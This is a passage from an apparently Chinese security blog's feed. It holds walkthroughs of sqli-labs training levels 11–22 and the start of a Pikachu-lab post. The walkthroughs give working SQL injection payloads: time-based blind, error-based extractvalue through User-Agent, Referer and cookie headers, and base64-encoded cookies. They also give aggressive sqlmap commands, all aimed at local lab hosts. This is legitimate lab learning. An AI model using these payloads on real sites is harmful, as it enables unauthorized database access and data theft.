less-11</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1749</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1749</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-16\"><a class=\"markdownIt-Anchor\" href=\"#总结-16\">#</a> 总结</h2>\n<p>bp 真好，sqlmap 真好，搬砖真难</p>\n<hr>\n<h1 id=\"less-17sqlmaping\"><a class=\"markdownIt-Anchor\" href=\"#less-17sqlmaping\">#</a> Less-17（sqlmaping）</h1>\n<p>date：2020-11-21 22:54:56</p>\n<h2 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程</h2>\n<p>看见题目又开心了起来，不是盲注啦</p>\n<h3 id=\"sqlmap-17\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-17\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 17.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 17.txt --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-17\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-17\">#</a> 手工注入</h3>\n<p>username 输入 <code>admin' or 1=1 -- </code></p>\n<p>竟然返回 bug off，you silly dump hacker</p>\n<p>哦豁，骂我，我要干你，等着</p>\n<p>我怀疑后台判断了用户输入，然后无数次尝试无数次被骂，我决定偷偷看一下源码</p>\n<p>源码中对 uname 限制了只能 15 个字符，单是这个就已经很无力了，后来看完源码才发现这是一个重置密码的表单，而且源码中并没有对 passwd 做限制</p>\n<p>眼瞎的我决定用时间盲注，bp send to repeater：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&amp;passwd=1&#x27; where 1=1 and if( length(database())=8,sleep(10),1 )--+&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>哈哈 服务器睡着啦，随后时间盲注就可以了，和上面的题目一样</p>\n<h2 id=\"总结-17\"><a class=\"markdownIt-Anchor\" href=\"#总结-17\">#</a> 总结</h2>\n<p>感觉用得多的还是盲注</p>\n<p>盲注手工注入最快就是用二分法，但是我是有 bp 的人！</p>\n<ol>\n<li>–risk=RISK 风险（1-4，默认 1）升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试；risk 3：or 语句的测试；risk 4：update 的测试</li>\n</ol>\n<hr>\n<h1 id=\"less-18\"><a class=\"markdownIt-Anchor\" href=\"#less-18\">#</a> Less-18</h1>\n<p>date：2020-11-22 00:19:07</p>\n<h2 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程</h2>\n<p>题目提示，Your IP ADDRESS is: 127.0.0.1，这题我会！肯定是 xff 头注入！（结果不是）</p>\n<h3 id=\"sqlmap-18\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-18\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 18.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 18.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-18\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-18\">#</a> 手工注入</h3>\n<p>既然不是 xff 头，那就看一下源码把</p>\n<p>源码中对账户密码进行了判断，必须要绕过去才能进行头注入，刚好上一题重置了密码</p>\n<p>那么就输入相应的账户密码，再在 user-agent 上注入就好啦，先来个单引号报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;, &#x27;admin&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>讲道理这里肯定是插入操作，那就是 insert 注入咯，源码确实是 insert，其实不管是什么注入，只要能大概弄 sql 语句，顺利让数据库执行我们的代码即可</p>\n<p>拿 database () 这里利用报错注入，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出，拿到当前数据库 security：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))#&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>后面爆字段值同 less-11，改一下 payload 即可</p>\n<h2 id=\"总结-18\"><a class=\"markdownIt-Anchor\" href=\"#总结-18\">#</a> 总结</h2>\n<p>看源码，就像考试作弊，心怀愧疚～～（跃跃欲试）~~</p>\n<ol>\n<li>level 参数：</li>\n</ol>\n<blockquote>\n<p>1 &gt; 探测等级： --level 5</p>\n<p>–level 5 指的是需要执行的测试等级</p>\n<p>一共有 5 个等级（1-5） 不加 level 时，默认是 1</p>\n<p>5 级包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>\n<p>level=2 http cookie 会测试</p>\n<p>level=3 http user-agent/referer 头会测试</p>\n<p>在不能确定哪个 payload 或参数为注入点时，建议使用高的 level 值。</p>\n</blockquote>\n<hr>\n<h1 id=\"less-19\"><a class=\"markdownIt-Anchor\" href=\"#less-19\">#</a> Less-19</h1>\n<p>date：2020-11-22 10:01:30</p>\n<h2 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程</h2>\n<h3 id=\"sqlmap-19\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-19\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 19.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 19.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-19\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-19\">#</a> 手工注入</h3>\n<p>看标题，referer 注入，看来后面的题目都是头注入了</p>\n<p>打开 hackbar，点击 post data，输入正确的用户名密码，提示我的 referer 是啥啥啥，再次确定就是 referer 头注入</p>\n<p>不知道为啥 hackbar 同时搞 postdata 和 referer，referer 没有起作用，上 bp：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>又是 insert 操作啦，利用报错注入 extractvalue () 拿当前数据库名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) # Content-Type: application/x-www-form-urlencodedContent-Length: 35Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit </span><br></pre></td></tr></table></figure>\n<p>根据输出，拿到当前数据库名 security：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) #&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>后续操作同 less-11</p>\n<h2 id=\"总结-19\"><a class=\"markdownIt-Anchor\" href=\"#总结-19\">#</a> 总结</h2>\n<p>sqlmap 新操作，感觉它不太行了？应该是我不太行，去百度 sqlmap 的使用姿势</p>\n<hr>\n<h1 id=\"less-20\"><a class=\"markdownIt-Anchor\" href=\"#less-20\">#</a> Less-20</h1>\n<p>date：2020-11-22 10:17:02</p>\n<h2 id=\"过程-20\"><a class=\"markdownIt-Anchor\" href=\"#过程-20\">#</a> 过程</h2>\n<h3 id=\"sqlmap-20\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-20\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 20.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-20\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-20\">#</a> 手工注入</h3>\n<p>先用 admin\\1 登录</p>\n<p>题目给了我的 cookie：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = admin and expires: Sun 22 Nov 2020 - 11:22:50Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>那就 cookie 注入呗，bp 抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-20/index.php HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-20/index.phpDNT: 1Connection: closeCookie: uname=adminUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>cookie 后单引号开战</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>后面的 sql 橘子拿到了，就开始常规姿势闭合，拿 database ()</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database())) # </span><br></pre></td></tr></table></figure>\n<p>输出，拿到库名 security：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure>\n<p>拿字段内容同 less-11</p>\n<h2 id=\"总结-20\"><a class=\"markdownIt-Anchor\" href=\"#总结-20\">#</a> 总结</h2>\n<p>报错注入真好用</p>\n<p>前面写了题，后面就越写越快了，开心</p>\n<hr>\n<h1 id=\"less-21\"><a class=\"markdownIt-Anchor\" href=\"#less-21\">#</a> Less-21</h1>\n<p>date：2020-11-22 10:29:18</p>\n<h2 id=\"过程-21\"><a class=\"markdownIt-Anchor\" href=\"#过程-21\">#</a> 过程</h2>\n<h3 id=\"sqlmap-21\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-21\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 21.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-21\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-21\">#</a> 手工注入</h3>\n<p>老规矩，输入 17 关重置后的账户密码 admin/1</p>\n<p>题目还是 cookie 注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 11:29:55Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>看标题是复杂版的…</p>\n<p>啊这，先试试引号，竟然不报错了！</p>\n<p>有趣</p>\n<p>看了下题目 uname 那里发生了改变，抓包发现 uname 是 YWRtaW4，改成 admin 试试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&quot;</span><br></pre></td></tr></table></figure>\n<p>输出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation &#x27;=&#x27;</span><br></pre></td></tr></table></figure>\n<p>说是编码集的问题，好叭我去百度<a href=\"https://www.cnblogs.com/escwq/p/12264076.html\">闯关秘籍了</a></p>\n<p>对 cookie 的值进行了 base64 的处理，其他和 20 关一样</p>\n<p>也就是说在注入的时候需要把注入语句搞一下编码，打开 hackbar，打开 base64 编码，输入 admin’</p>\n<p>bp 发包设置 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=YWRtaW4n</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>拿到后面的句子，开始闭合注入，不知为何我转义后的报错注入代码放进 payload 没有反应，换一个加密工具就好了</p>\n<p>用报错注入拿数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64转义：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=设置cookie：Cookie: uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;YOUR COOKIE : uname = YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA= and expires: Sun 22 Nov 2020 - 12:30:51&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure>\n<p>拿到数据库名，拿别的数据同 less-11</p>\n<h2 id=\"总结-21\"><a class=\"markdownIt-Anchor\" href=\"#总结-21\">#</a> 总结</h2>\n<p><a href=\"https://blog.csdn.net/makenothing/article/details/81155960\">base64 使用场景及原理</a></p>\n<p>base64 最早就是用来邮件传输协议中的，原因是邮件传输协议只支持 ascii 字符传递，因此如果要传输二进制文件，如：图片、视频是无法实现的。</p>\n<p>因此 base64 就可以用来将二进制文件内容编码为只包含 ascii 字符的内容。</p>\n<p>我们知道在计算机中任何数据都是按 ascii 码存储的，而 ascii 码的 128～255 之间的值是不可见字符。而在网络上交换数据时，比如说从 A 地传到 B 地，往往要经过多个路由设备，由于不同的设备对字符的处理方式有一些不同，这样那些不可见字符就有可能被处理错误，这是不利于传输的。所以就先把数据先做一个 Base64 编码，统统变成可见字符，这样出错的可能性就大降低了。</p>\n<hr>\n<h1 id=\"less-22\"><a class=\"markdownIt-Anchor\" href=\"#less-22\">#</a> Less-22</h1>\n<p>date：2020-11-22 11:35:53</p>\n<h2 id=\"过程-22\"><a class=\"markdownIt-Anchor\" href=\"#过程-22\">#</a> 过程</h2>\n<h3 id=\"sqlmap-22\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-22\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 22.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-22\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-22\">#</a> 手工注入</h3>\n<p>还是用 admin\\1 登录，显示 cookie，那就还是 cookie 注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 12:37:26Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>看见 uname = YWRtaW4= ，那就应该还是用 base64 加密</p>\n<p>使用上一题的 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>发现没有报错显示，那么说明没有闭合成功，看标题是双引号闭合，那就改一下引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&quot;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4iKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # &quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>哪到后面的 sql 语句，发现只需要闭合一个双引号，不需要），开干</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&quot; and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoJywnLGRhdGFiYXNlKCkpKSAjIA==</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure>\n<p>拿到数据库名，拿别的数据同 less-11</p>\n<h2 id=\"总结-22\"><a class=\"markdownIt-Anchor\" href=\"#总结-22\">#</a> 总结</h2>\n<p>我发现 sqlmap 跑得有一点慢</p>\n",
            "tags": [
                "sql注入靶场"
            ]
        },
        {
            "id": "http://example.com/2020/10/30/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/",
            "url": "http://example.com/2020/10/30/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/",
            "title": "pikachu大冒险鸭",
            "date_published": "2020-10-30T03:46:05.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h2 id=\"搜索型注入\"><a class=\"markdownIt-Anchor\" href=\"#搜索型注入\">#</a> 搜索型注入</h2>\n<p><strong>过程</strong></p>\n<p><img src=\"pikachu-sql-001.png\" alt=\"\"></p>\n<p>爆出数据库，确定了是三个字段输出<img src=\"pikachu-sql-002.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xx型注入\"><a class=\"markdownIt-Anchor\" href=\"#xx型注入\">#</a> xx 型注入</h2>\n<p><strong>过程</strong></p>\n<p>我是想看报错信息的，三个单引号，结果莫名其妙就过了</p>\n<p>pyload：<a href=\"http://www.pikachu.com/vul/sqli/sqli_x.php\">http://www.pikachu.com/vul/sqli/sqli_x.php</a><br>\n?name=’’’) union select 1,database() %23<br>\n&amp;submit=%E6%9F%A5%E8%AF%A2</p>\n<p>哦，刚刚试了下，一个单引号就过了，之所以➕），是因为看报错信息的时候发现最后面有一个），所以想到小括号可能没有闭合</p>\n<p><img src=\"pikachu-sql-003.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"insertupdate注入\"><a class=\"markdownIt-Anchor\" href=\"#insertupdate注入\">#</a> &quot;insert/update&quot; 